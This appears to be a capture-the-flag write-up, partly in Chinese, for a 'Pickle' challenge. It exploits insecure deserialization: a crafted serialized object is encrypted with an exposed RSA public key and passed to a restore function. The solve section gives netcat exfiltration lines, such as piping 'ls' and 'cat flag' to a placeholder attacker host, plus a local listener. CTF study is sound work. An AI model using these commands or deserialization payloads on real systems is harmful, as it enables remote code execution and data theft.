# Pickle
`nc 140.113.194.85 49167`，[source code](spam.py)
 1. connect to server, everything is protected under **rsa**
 2. **backup password**  => **searlized** password to string => **encrypt string by rsa Public key**
 2. **restore password** => **desearlized** password from **rsa-encrypted string**
 3. **show key** => show **current rsa public key** for encryption

## Solve
 因為可以拿到rsa public key，restore password 會呼叫desearlized function
 * => 直接自己寫一個在desearlized時do_something() 的class => searlize => encrypted => restore password => do_something()！

### 那 do_something要做什麼呢？
 * 開啟shell？不行，因為開在對方螢幕上，我們用netcat溝通是看不到的
 * 那，要怎麼把東西傳到netcat我們這裡呢？
  * `nc 140.113.194.85 49167`，連到對方主機透過nc 溝通
 * 那**既然能連過去，當然對方也能連回來我們這裡**
  * 在自己電腦上用`nc -l 1234`開啟一個port做監聽
  * 在對方主機上做的事情，例如列所有目錄下的檔案`ls`之後用netcat傳給我們，我們會收到！
   * `ls | (nc xxx.xxx.xxx.xxxx 1234)`
   * `(cat flag) | (nc xxx.xxx.xxx.xxx 1234)`
 * [solve.py](solve.py)
